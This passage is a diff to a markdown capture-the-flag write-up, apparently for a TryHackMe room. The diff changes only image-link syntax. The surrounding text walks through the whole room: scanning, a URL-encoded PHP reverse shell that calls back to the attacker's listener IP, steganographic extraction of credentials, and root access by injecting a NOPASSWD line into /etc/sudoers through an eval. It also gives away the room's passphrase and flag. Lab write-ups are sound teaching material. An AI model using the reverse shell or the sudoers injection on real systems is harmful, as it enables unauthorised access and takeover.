@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 175.78 seconds
 - There is one http server is running on port 80 so after visiting i got this site.
 ```
 
-![[Pasted image 20261029175042.png]]
+![Pasted image 20261029175042](../../../../Images/Pasted%20image%2020261029175042.png)
 
 ```
 - So tried to run gobuster on this site for directory discovery.
@@ -136,7 +136,7 @@ Finished
 
 # 3. Initial Access
 
-![[Pasted image 20261029180425.png]]
+![Pasted image 20261029180425](../../../../Images/Pasted%20image%2020261029180425.png)
 
 ```
 - it showed me this. in the end there are 2 equal to sign which means it is base64 encoded. so i try to decode it
@@ -153,9 +153,9 @@ php -r '%24sock%3Dfsockopen("192.168.131.194"%2C9001)%3Bexec("sh <%263 >%263 2>%
 - So first i started a listener and pasted this payload on php site
 ```
 
-![[Pasted image 20261029201403.png]]
+![Pasted image 20261029201403](../../../../Images/Pasted%20image%2020261029201403.png)
 
-![[Pasted image 20261029201507.png]]
+![Pasted image 20261029201507](../../../../Images/Pasted%20image%2020261029201507.png)
 
 ```
 - After some investigation i got this image file 
@@ -164,17 +164,17 @@ php -r '%24sock%3Dfsockopen("192.168.131.194"%2C9001)%3Bexec("sh <%263 >%263 2>%
 - so when i tried to open the file it wad not opening due to some error
 ```
 
-![[Pasted image 20261029202312.png]]
+![Pasted image 20261029202312](../../../../Images/Pasted%20image%2020261029202312.png)
 
 ```
 - After some further investigation i got see that image is corrupt and its PNG not jpg using XXD command so we need to correct it using one github tool i know which is - MagicBytes
 ```
 
-![[Pasted image 20261029203714.png]]
+![Pasted image 20261029203714](../../../../Images/Pasted%20image%2020261029203714.png)
 
-![[Pasted image 20261029203802.png]]
+![Pasted image 20261029203802](../../../../Images/Pasted%20image%2020261029203802.png)
 
-![[Pasted image 20261029203812.png|700]]
+![700](../../../../Images/Pasted%20image%2020261029203812.png)
 
 ```
 - After this i got a cool image and also there is clue in this image so used steghide for investigation.
@@ -185,30 +185,30 @@ Enter passphrase:
 - But it asked for passphrase so i more dig into shell and got the passphrase which was base64 encoded.
 ```
 
-![[Pasted image 20261029203925.png]]
+![Pasted image 20261029203925](../../../../Images/Pasted%20image%2020261029203925.png)
 
-![[Pasted image 20261029204322.png]]
+![Pasted image 20261029204322](../../../../Images/Pasted%20image%2020261029204322.png)
 
 ```
 - Encoded base64 - QWxsbWlnaHRGb3JFdmVyISEhCg==
 - Decoded base64 - AllmightForEver!!!
 ```
 
-![[Pasted image 20261029204512.png]]
+![Pasted image 20261029204512](../../../../Images/Pasted%20image%2020261029204512.png)
 
 ```
 - After entering the passphrase we got a creds.txt. I guess we got user for ssh and password for it.
 ```
 # 4. Privilege Escalation
 
-![[Pasted image 20261029204743.png]]
+![Pasted image 20261029204743](../../../../Images/Pasted%20image%2020261029204743.png)
 
 ```
 - We got the ssh connection now we can try to get privilege escalation
 - Also we got our first flag - THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
 ```
 
-![[Pasted image 20261029204932.png]]
+![Pasted image 20261029204932](../../../../Images/Pasted%20image%2020261029204932.png)
 
 ```
 - In order to get root access first command i ran is "sudo -l" and got this answer.
@@ -224,13 +224,13 @@ User deku may run the following commands on ip-10-49-143-204:
 deku@ip-10-49-143-204:~$ 
 ```
 
-![[Pasted image 20261029205341.png]]
+![Pasted image 20261029205341](../../../../Images/Pasted%20image%2020261029205341.png)
 
 ```
 - I dont much about used bash scripting so i used chatgpt for this and got to know that there is eval command which executes commands for us so i entered a malicious payload - deku ALL=NOPASSWD: ALL >> /etc/sudoers
 ```
 
-![[Pasted image 20261029210150.png]]
+![Pasted image 20261029210150](../../../../Images/Pasted%20image%2020261029210150.png)
 
 ```
 - Hence we got the root access and got the flag
